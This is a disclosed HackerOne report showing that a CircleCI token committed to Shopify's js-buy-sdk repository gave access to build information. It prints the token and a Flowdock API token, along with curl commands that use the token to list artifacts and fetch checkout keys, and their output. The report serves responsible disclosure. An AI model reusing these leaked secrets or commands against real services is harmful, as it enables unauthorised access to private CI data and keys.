# CircleCI token in github repo allows for access to sensitive build information

## Report Details
- **Report ID**: 858915
- **URL**: https://hackerone.com/reports/858915
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-04-24T22:54:41.420Z
- **Disclosed**: 2020-09-15T09:30:29.312Z

## Reporter
- **Username**: dwimmerlaik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
While looking through some Shopify Github repos I came across the following CircleCI token: `ca84774a88598f639b174d498c219163e04adbb2` in the   `js-buy-sdk` repo.

`curl https://circleci.com/api/v1.1/me?circle-token=ca84774a88598f639b174d498c219163e04adbb2` returns information about the user which confirms the token is valid. 

### Project and Build
I am able to view project and build information using the token, which is a potential source of more exposed information such as API keys for any integrated services, such as:

`"flowdock_api_token" : "7e6b75e2335d035c192c338b390ee9e5",`

I have also confirmed that I can list build artifacts for a given project, and that if the files were still available then I would be able to download them (however given they are stored in `/tmp` the time availble to do this is limited, and as such I was not able to find a file that still existed for me to download) 
```
curl -H'Circle-Token: ca84774a88598f639b174d498c219163e04adbb2' https://circleci.com/api/v1.1/project/github/Shopify/js-buy-sdk/1200/artifacts
[ {
  "path" : "/tmp/circle-junit.Thki57l/xunit/tests.xml",
  "pretty_path" : "$CIRCLE_TEST_REPORTS/xunit/tests.xml",
  "node_index" : 0,
  "url" : "https://1200-49018115-gh.circle-artifacts.com/0/tmp/circle-junit.Thki57l/xunit/tests.xml"
}, {
  "path" : "/tmp/circle-junit.97eTO3B/xunit/tests.xml",
  "pretty_path" : "$CIRCLE_TEST_REPORTS/xunit/tests.xml",
  "node_index" : 1,
  "url" : "https://1200-49018115-gh.circle-artifacts.com/1/tmp/circle-junit.97eTO3B/xunit/tests.xml"

curl -L -H'Circle-Token: ca84774a88598f639b174d498c219163e04adbb2' https://1200-49018115-gh.circle-artifacts.com/1/tmp/circle-junit.97eTO3B/xunit/tests.xml
This artifact is no longer available to download
```

### Accessing Keys
I am also able to access keys using this token, with the following responses from two different projects
```
curl https://circleci.com/api/v1.1/project/github/Shopify/u2/checkout-key?circle-token=ca84774a88598f639b174d498c219163e04adbb2

[ {
  "public_key" : "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpvB3DfDKTHA7FoYR7GCDX4KzvNZuDoYH6cyLm2MGahYHXQXYhD/f+tUfrQadkt/fzkNElftncXSFj6kgzj2UeAhG1uQnAkA/neaUxhohdE21WwV4FH31hq30TgcJqFu4EN5nqaoaceY6MJvmtT/n1z3yGaJ/o3XgOwkY2GmiAvHBm6RdIlW0PX5t7elm4O9E6pDEo/6MwiuhtSQE3QPNMVM0w5ImRsSukiya8j7sgY5hco3a3Vo67dzM69+JiifgEutnC3Xv4x3bp1SS2Mww7wUGMgCaVtKMoQhSoqlft8mIWxCaIwdKXMyT8JmFmh16uBqKYWjJI+hj0ZS/sAox3 \n",
  "type" : "github-user-key",
  "fingerprint" : "b3:8c:e5:2f:fd:b8:f9:f1:4b:73:8f:fb:94:ed:6d:66",
  "login" : "shopify-dep",
  "preferred" : true,
  "time" : "2016-03-18T20:15:11.599Z"
}, {
  "public_key" : "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCn5QuM7S1Rebg3A2P29L3fJL1vELVX2YKZEyZiIx4S9wnGQdsEq9AHZfUfhmG7ko+Yu8hU73nYEjhPozc4QWgjroAEtnnurCW4Ol/CEU7SYt0P5tv1sXweahNT0LiUY6nJcQMxYu2y4Zn4+F6gk80GIqk7sZKSOLXi58fZO99Gu4rx0YNDKyzmZMkXNlxnP6692Tkxap0ce9hbl3sABnuwB0/jqAnyvLKm8/Fp3jExZZnv2eipzaymJXwgRHthmqPpnkHoM8rft7FrlrEia9pZ0UrRcsXgOXz2eJuiKnbu9PNLXmxXtylzEsF9u+jghl+jHdo1rHxNkWI7OOLmVmE5 \n",
  "type" : "github-user-key",
  "fingerprint" : "52:aa:16:d3:5e:b1:c8:94:75:7a:90:93:0d:04:b5:a3",
  "login" : "sunblaze",
  "preferred" : false,
  "time" : "2015-11-02T18:00:32.192Z"
} ]
```

```
curl https://circleci.com/api/v1.1/project/github/Shopify/js-buy-sdk/checkout-key?circle-token=ca84774a88598f639b174d498c219163e04adbb2

[ {
  "public_key" : "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7umG5nXtN6YesRFIyn6wsSGRszZYlvVke+CUy5BqPKU2TpwV2fINS80pjBxroMeeiOFtTdvsxd+KuG7v+1oLA7osY2B4SEAhnWedY7biaP5TdYM1yh5QcimqEFUbykFmlsQPEk1vNqS1lHuHn9OGhmJy5Ak2+a3wVoyT8pIFVA0j/m5d3WFWP7TcLyK3H5Rf+jFqtO73oZwejuF6YnqZBP5eNxhaQ325zwpeUBj8+crcRtOXhrEY1ovuuqxRLWEmEsdmbbhm4chP8NMYoW33yizl50bokEXk1KvNR0w/jM+DGt0WCUnyd3kufjFZD223/Wd5ytPNxBaE5h+68gkIH \n",
  "type" : "github-user-key",
  "fingerprint" : "b5:09:e2:4e:28:2a:e5:af:26:6d:17:f1:79:86:c9:26",
  "login" : "shopify-dep",
  "preferred" : true,
  "time" : "2016-03-18T20:24:30.573Z"
} ]
```

## Impact

Using the CircleCI API docs (https://circleci.com/docs/api/#projects) we can see that an attacker could do a lot using this token. Including running or cancelling builds; viewing information about past builds; creating and deleting keys, and accessing build artifacts or environment variables.

I have verified that many of the `GET` requests work with this token, however, I haven't tested any `POST` requests since I obviously don't want to cause any problems by changing anything.

P.S. - I just selected *.shopify.com as the asset because it seemed most appropriate but I wasn't really sure what this issue might affect since it's a part of the VCS/CI pipeline

## Attachments
- build-artifacts.png
- keys.png
